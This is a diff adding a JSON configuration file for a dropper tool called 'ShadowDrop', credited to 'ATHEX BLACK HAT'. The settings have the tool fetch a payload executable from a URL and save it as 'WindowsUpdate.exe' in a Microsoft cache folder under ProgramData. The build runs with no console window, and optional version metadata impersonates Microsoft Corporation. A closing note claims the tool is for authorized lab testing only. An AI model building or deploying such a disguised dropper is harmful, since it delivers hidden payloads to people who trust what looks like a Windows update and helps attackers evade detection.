@@ -1,0 +1,45 @@
+{
+    "_comment": "ShadowDrop",
+    "_developer": "ATHEX BLACK HAT",
+    "_version": "1.0.0",
+    "_instructions": [
+        "....................."
+    ],
+
+    "EXE_URL": "http://localhost:8080/payload.exe",
+    "FINAL_NAME": "WindowsUpdate.exe",
+    "EXEC_FOLDER": "%ProgramData%\\Microsoft\\Windows\\Caches",
+
+    "OUTPUT_NAME": "dropper",
+    "ICON": "",
+    "UPX": false,
+
+    "VERSION_INFO": {
+        "_comment": "Optional metadata spoofing for compiled EXE",
+        "enabled": false,
+        "CompanyName": "Microsoft Corporation",
+        "FileDescription": "Windows Update Service",
+        "ProductName": "Microsoft® Windows® Operating System",
+        "LegalCopyright": "© Microsoft Corporation",
+        "FileVersion": "10.0.19041.1",
+        "ProductVersion": "10.0.19041.1",
+        "OriginalFilename": "WindowsUpdate.exe",
+        "InternalName": "WindowsUpdate"
+    },
+
+    "BUILD": {
+        "_comment": "PyInstaller build options",
+        "onefile": true,
+        "noconsole": true,
+        "clean": true,
+        "noconfirm": true,
+        "strip": false,
+        "debug": false
+    },
+
+    "METADATA": {
+        "created": "2026-09-24",
+        "author": "ATHEX BLACK HAT",
+        "notes": "Internal lab testing only. Authorized environments."
+    }
+}
